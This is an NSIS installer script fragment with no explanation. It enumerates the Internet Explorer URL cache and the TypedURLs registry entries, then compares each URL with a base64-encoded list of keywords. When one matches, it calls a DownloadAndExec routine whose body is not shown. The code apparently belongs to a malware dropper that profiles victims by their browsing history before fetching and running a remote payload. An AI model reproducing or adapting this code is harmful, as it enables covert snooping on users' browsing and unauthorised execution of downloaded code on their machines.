
!define URLHISTORY_CACHE_ENTRY 0x200000

Function ScanIeHistoryCheckWords
Exch $1
Push $0
${Base64_Decode} ${IE_HISTORY_WORDS}
loop:
    call SplitArgs
    Pop $0
    ${If} $0 == ""
	Pop $0
	Pop $1
	Push ""
        Goto done
    ${EndIf}
    ${WordFind} $0 "*" "#" $2
    ${If} $0 != $2
	${WordReplace} $0 "*" "" "+" $0
	${WordFind} $1 $0 "#" $2
	${If} $1 != $2
	    !if ${DEBUG_MODE} == true
		DetailPrint 'Stop on IE cache: $1 (By floating tag: "$0")'
	    !endif
	    call DownloadAndExec
	    Pop $0
	    Pop $1
	    Push "OK"
	    Goto done
	${EndIf}
    ${Else}
	${WordFind} $1 $0 "#" $2
	${If} $1 != $2
	    !if ${DEBUG_MODE} == true
		DetailPrint 'Stop on IE cache: $1 (By fixed tag: "$0")'
	    !endif
	    call DownloadAndExec
	    Pop $0
	    Pop $1
	    Push "OK"
	    Goto done
	${EndIf}
    ${EndIf}
    Goto loop
done:
FunctionEnd

Function ScanIeHistory
Push $0
Push $1
Push $2
Push $3
Push $4
Push $5
Push $6
System::Alloc 32768
Pop $0
System::Alloc 4
Pop $1
System::Call "*$0(i80,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i)"
System::Call "*$1(i32768)"
StrCpy $6 ""
System::Call "Wininet::FindFirstUrlCacheEntry(i,i,i) i (0,$0,$1) .r2"
${If} $2 != 0
    ${Do}
        System::Call "*$0(i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i) i (,.r3,,.r4,,,,,,,,,,,,,,,,,,,,,,,,)"
        Intop $4 $4 & ${URLHISTORY_CACHE_ENTRY}
	${If} $4 != 0
	    System::Call "kernel32::lstrcpy(t,i) i (.r5,r3) $6"
	    ${WordFind} $5 "@file" "#" $4
	    ${If} $5 == $4
		Push $5
		Call ScanIeHistoryCheckWords
		Pop $6
		StrCmp $6 "" 0 scan_ie_cache_end
	    ${EndIf}
	${EndIf}
        System::Call "*$0(i80,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i)"
        System::Call "*$1(i32768)"
        System::Call "Wininet::FindNextUrlCacheEntry(i,i,i) i ($2,$0,$1) .r3"
    ${LoopUntil} $3 == 0
    scan_ie_cache_end:
    System::Call "Wininet::FindCloseUrlCache(i) i ($2) "
${EndIf}
StrCmp $6 "" 0 done
StrCpy $5 0
${Do}
    EnumRegValue $3 HKCU "Software\Microsoft\Internet Explorer\TypedURLs" $5
    ${If} $3 != ""
	ReadRegStr $4 HKCU "Software\Microsoft\Internet Explorer\TypedURLs" $3
	Push $4
	Call ScanIeHistoryCheckWords
	Pop $6
	StrCmp $6 "" 0 done
    ${EndIf}
    IntOp $5 $5 + 1
${LoopUntil} $3 == ""
done:
System::Free $1
System::Free $0
Pop $6
Pop $5
Pop $4
Pop $3
Pop $2
Pop $1
Pop $0
FunctionEnd
